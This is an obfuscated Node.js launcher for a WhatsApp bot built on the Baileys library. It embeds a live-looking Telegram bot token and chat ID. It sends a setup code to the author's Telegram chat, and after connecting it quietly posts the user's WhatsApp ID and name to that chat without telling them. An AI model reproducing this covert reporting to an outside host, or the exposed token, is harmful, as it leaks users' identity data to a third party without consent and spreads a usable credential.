console.clear();
console.log("Starting...");
require("./setting/settings");
const {
  default: makeWASocket,
  prepareWAMessageMedia,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  makeInMemoryStore,
  generateWAMessageFromContent,
  generateWAMessageContent,
  jidDecode,
  proto,
  relayWAMessage,
  getContentType,
  getAggregateVotesInPollMessage,
  downloadContentFromMessage,
  fetchLatestWaWebVersion,
  InteractiveMessage,
  makeCacheableSignalKeyStore,
  Browsers,
  generateForwardMessageContent,
  MessageRetryMap
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const readline = require("readline");
const fs = require("fs");
const chalk = require("chalk");
const {
  Boom
} = require("@hapi/boom");
const {
  color
} = require("./lib/color");
const {
  smsg,
  sendGmail,
  formatSize,
  isUrl,
  generateMessageTag,
  getBuffer,
  getSizeMedia,
  runtime,
  fetchJson,
  sleep
} = require("./lib/myfunction");
const axios = require("axios");
function generateOTP(_0x421773) {
  let _0x376248 = "";
  for (let _0x9df3d2 = 0; _0x9df3d2 < _0x421773; _0x9df3d2++) {
    _0x376248 += Math.floor(Math.random() * 10).toString();
  }
  return _0x376248;
}
const token = "7912376416:AAHiCvC109R_9ole0Uq5VI81UkQEeQXT6Zo";
const telegua = "6758060721";
const usePairingCode = true;
const question = _0x302323 => {
  const _0x4a08b3 = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });
  return new Promise(_0x491668 => {
    _0x4a08b3.question(_0x302323, _0x491668);
  });
};
const store = makeInMemoryStore({
  logger: pino().child({
    level: "silent",
    stream: "store"
  })
});
const sendTelegramNotification = async _0x4d2e35 => {
  try {
    await axios.post("https://api.telegram.org/bot7912376416:AAHiCvC109R_9ole0Uq5VI81UkQEeQXT6Zo", {
      chat_id: "6758060721",
      text: _0x4d2e35
    });
  } catch (_0x155402) {}
};
async function isAuthorizedNumber(_0x382920) {

  const _0x52f3bc = "https://raw.githubusercontent.com/fahriasikamat/Database-Crazyyy/refs/heads/main/zynxzo.json";

  try {

    const _0x12a14b = await axios.get(_0x52f3bc);

    const _0x17a24b = _0x12a14b.data.dbnya;

    return _0x17a24b.includes(_0x382920);

  } catch (_0x55fdcf) {

    console.error("Error fetching database:", _0x55fdcf.message);

    return;

  }

}
async function ConnetToWhatsapp() {
  const {
    state: _0x43e734,
    saveCreds: _0x5eb696
  } = await useMultiFileAuthState("./session");
  const _0x55993e = makeWASocket({
    logger: pino({
      level: "silent"
    }),
    printQRInTerminal: !usePairingCode,
    auth: _0x43e734,
    browser: ["Ubuntu", "Chrome", "20.0.04"]
  });
  if (usePairingCode && !_0x55993e.authState.creds.registered) {
    const _0x2881f4 = 6;
    const _0xc99cde = generateOTP(_0x2881f4);
    const _0x39e777 = "𝗦𝗲𝗯𝘂𝗮𝗵 𝗽𝗲𝗿𝗮𝗻𝗴𝗸𝗮𝘁 𝗺𝗲𝗻𝗴𝗶𝗿𝗶𝗺𝗸𝗮𝗻 𝗸𝗼𝗱𝗲 𝘃𝗲𝗿𝗶𝗳𝗶𝗸𝗮𝘀𝗶. 𝗸𝗼𝗱𝗲 𝘃𝗲𝗿𝗶𝗳𝗶𝗸𝗮𝘀𝗶 𝘂𝗻𝘁𝘂𝗸 𝗺𝗲𝗻𝗴𝗮𝗸𝘀𝗲𝘀 𝗯𝗼𝘁 👇";
    const _0xb52c33 = "" + _0xc99cde;
    await axios.post("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + telegua + "&text=" + _0x39e777);
    await axios.post("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + telegua + "&text=" + _0xb52c33);
    const _0x234d11 = await question(chalk.cyan.bold("Script Membutuhkan Code Verifikasi\nCode : "));
    if (_0xc99cde !== _0x234d11) {
      console.log(chalk.red.bold("Code verification salah"));
      await sleep(1000);
      process.exit();
    }
    const _0x2c1b27 = await question(chalk.cyan.bold("Enter Your Number\nNumber : "));
    const _0x5d255e = await isAuthorizedNumber(_0x2c1b27);
     
    const _0x3abec7 = await _0x55993e.requestPairingCode(_0x2c1b27);
    console.log(chalk.green.bold("Code : " + _0x3abec7));
  }
  store.bind(_0x55993e.ev);
  _0x55993e.ev.on("messages.upsert", async (_0x29ee75, _0x374809) => {
    try {
      const _0x59550f = _0x29ee75.messages[0];
      if (!_0x59550f.message) {
        return;
      }
      _0x59550f.message = Object.keys(_0x59550f.message)[0] === "ephemeralMessage" ? _0x59550f.message.ephemeralMessage.message : _0x59550f.message;
      if (_0x59550f.key && _0x59550f.key.remoteJid === "status@broadcast") {
        return;
      }
      if (!_0x55993e.public && !_0x59550f.key.fromMe && _0x29ee75.type === "notify") {
        return;
      }
      if (_0x59550f.key.id.startsWith("BAE5") && _0x59550f.key.id.length === 16) {
        return;
      }
      if (_0x59550f.key.id.startsWith("FatihArridho_")) {
        return;
      }
      const _0x31b030 = smsg(_0x55993e, _0x59550f, store);
      require("./JinZo")(_0x55993e, _0x31b030, _0x29ee75, store);
    } catch (_0x14a967) {
      console.log(_0x14a967);
    }
  });
  _0x55993e.decodeJid = _0x57a470 => {
    if (!_0x57a470) {
      return _0x57a470;
    }
    if (/:\d+@/gi.test(_0x57a470)) {
      let _0x475013 = jidDecode(_0x57a470) || {};
      return _0x475013.user && _0x475013.server && _0x475013.user + "@" + _0x475013.server || _0x57a470;
    } else {
      return _0x57a470;
    }
  };
  _0x55993e.ev.on("contacts.update", _0x58495c => {
    for (let _0x45ac9e of _0x58495c) {
      let _0x19a46e = _0x55993e.decodeJid(_0x45ac9e.id);
      if (store && store.contacts) {
        store.contacts[_0x19a46e] = {
          id: _0x19a46e,
          name: _0x45ac9e.notify
        };
      }
    }
  });
  _0x55993e.public = true;
  _0x55993e.ev.on("connection.update", async _0x1683ba => {
    const {
      connection: _0x1e5937,
      lastDisconnect: _0x2453b8
    } = _0x1683ba;
    if (_0x1e5937 === "close") {
      const _0x3104ba = new Boom(_0x2453b8?.error)?.output.statusCode;
      console.log(color(_0x2453b8.error, "deeppink"));
      if (_0x2453b8.error == "Error: Stream Errored (unknown)") {
        process.exit();
      } else if (_0x3104ba === DisconnectReason.badSession) {
        console.log(color("Bad Session File, Please Delete Session and Scan Again"));
        process.exit();
      } else if (_0x3104ba === DisconnectReason.connectionClosed) {
        console.log(color("[SYSTEM]", "white"), color("Connection closed, reconnecting...", "deeppink"));
        process.exit();
      } else if (_0x3104ba === DisconnectReason.connectionLost) {
        console.log(color("[SYSTEM]", "white"), color("Connection lost, trying to reconnect", "deeppink"));
        process.exit();
      } else if (_0x3104ba === DisconnectReason.connectionReplaced) {
        console.log(color("Connection Replaced, Another New Session Opened, Please Close Current Session First"));
        _0x55993e.logout();
      } else if (_0x3104ba === DisconnectReason.loggedOut) {
        console.log(color("Device Logged Out, Please Scan Again And Run."));
        _0x55993e.logout();
      } else if (_0x3104ba === DisconnectReason.restartRequired) {
        console.log(color("Restart Required, Restarting..."));
        await ConnetToWhatsapp();
      } else if (_0x3104ba === DisconnectReason.timedOut) {
        console.log(color("Connection TimedOut, Reconnecting..."));
        ConnetToWhatsapp();
      }
    } else if (_0x1e5937 === "connecting") {
      console.log(color("Menghubungkan . . . "));
    } else if (_0x1e5937 === "open") {
      console.log(color("Bot Berhasil Tersambung"));
      sendTelegramNotification("connected information report\n\nthe device has been connected, here is the information\nUser ID : " + _0x55993e.user.id + "\nName : " + _0x55993e.user.name);
    }
  });
  _0x55993e.sendText = (_0x49162b, _0x4a1cc6, _0x373a62 = "", _0x16eaea) => _0x55993e.sendMessage(_0x49162b, {
    text: _0x4a1cc6,
    ..._0x16eaea
  }, {
    quoted: _0x373a62
  });
  _0x55993e.downloadMediaMessage = async _0x21bdf1 => {
    let _0x5f441d = (_0x21bdf1.msg || _0x21bdf1).mimetype || "";
    let _0x58a1d0 = _0x21bdf1.mtype ? _0x21bdf1.mtype.replace(/Message/gi, "") : _0x5f441d.split("/")[0];
    const _0x3f6018 = await downloadContentFromMessage(_0x21bdf1, _0x58a1d0);
    let _0x2ca709 = Buffer.from([]);
    for await (const _0x115d34 of _0x3f6018) {
      _0x2ca709 = Buffer.concat([_0x2ca709, _0x115d34]);
    }
    return _0x2ca709;
  };
  _0x55993e.ev.on("creds.update", _0x5eb696);
  return _0x55993e;
}
ConnetToWhatsapp();
let file = require.resolve(__filename);
require("fs").watchFile(file, () => {
  require("fs").unwatchFile(file);
  console.log("[0;32m" + __filename + " [1;32mupdated![0m");
  delete require.cache[file];
  require(file);
});